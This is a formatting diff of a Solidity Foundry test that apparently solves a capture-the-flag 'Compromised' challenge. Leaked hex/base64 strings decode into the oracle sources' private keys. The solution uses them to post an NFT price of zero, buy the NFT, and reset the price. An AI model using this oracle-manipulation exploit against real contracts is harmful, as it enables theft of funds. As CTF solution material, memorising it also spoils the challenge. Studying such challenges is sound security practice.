@@ -80,14 +80,14 @@ contract CompromisedChallenge is Test {
             hex"4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130";
         bytes memory key2 =
             hex"4d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535";
-        
+
         bytes memory source1Key = keySearch(key1);
         bytes memory source2Key = keySearch(key2);
-        
+
         uint256 sourceKey_1 = vm.parseUint(string(source1Key));
         vm.broadcast(sourceKey_1); //Trusted source 1
         TrustfulOracle(oracle).postPrice("DVNFT", 0);
-        
+
         uint256 sourceKey_2 = vm.parseUint(string(source2Key));
         vm.broadcast(sourceKey_2); //Trusted source 2
         TrustfulOracle(oracle).postPrice("DVNFT", 0);
@@ -95,7 +95,7 @@ contract CompromisedChallenge is Test {
         vm.startPrank(player);
         exchange.buyOne{value: address(player).balance}();
         vm.stopPrank();
-       
+
         //Oracle changes the price of the NFT back to the initial price
         vm.broadcast(sourceKey_1); //Trusted source 1
         TrustfulOracle(oracle).postPrice("DVNFT", INITIAL_NFT_PRICE);
@@ -115,21 +115,20 @@ contract CompromisedChallenge is Test {
     function keySearch(bytes memory key) internal view returns (bytes memory base64Decoded) {
         string memory hexBytes = string(key);
 
-        base64Decoded = Base64.decode(hexBytes);//private key
+        base64Decoded = Base64.decode(hexBytes); //private key
 
         // Derive address
         address derivedAddr = vm.addr(vm.parseUint(string(base64Decoded)));
         //get the address and return its respective key if derived address matches the any three of the oracle addresses
-        for(uint i = 0 ; i < sources.length; ){
-            if(derivedAddr == sources[i]){
+        for (uint256 i = 0; i < sources.length;) {
+            if (derivedAddr == sources[i]) {
                 return base64Decoded;
             }
             unchecked {
                 i++;
             }
-        } 
+        }
     }
-
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
